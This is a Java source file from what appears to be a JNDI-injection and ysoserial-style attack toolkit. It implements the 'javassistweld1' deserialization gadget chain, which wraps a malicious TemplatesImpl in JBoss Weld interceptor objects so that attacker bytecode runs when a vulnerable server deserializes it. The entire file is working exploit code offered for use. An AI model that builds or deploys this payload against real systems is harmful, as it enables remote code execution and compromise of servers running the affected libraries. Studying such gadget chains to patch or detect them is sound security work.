package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
import org.jboss.weld.interceptor.builder.MethodReference;
import org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.weld.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.weld.interceptor.reader.DefaultMethodMetadata;
import org.jboss.weld.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
import org.jboss.weld.interceptor.spi.model.InterceptionModel;
import org.jboss.weld.interceptor.spi.model.InterceptionType;

import java.lang.reflect.Constructor;
import java.util.*;

import static com.qi4l.jndi.Starter.JYsoMode;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final",
        "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
        "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21"})
@Authors({Authors.MATTHIASKAISER})
public class javassistweld1 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object tpl;
        if (JYsoMode.contains("yso")) {
            tpl = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            tpl = Gadgets.createTemplatesImpl(type, param);
        }

        InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference    interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        Reflections.setAccessible(defaultMethodMetadataConstructor);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {

            public Object createFor(InterceptorReference paramInterceptorReference) {

                return tpl;
            }
        };

        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);

    }
}
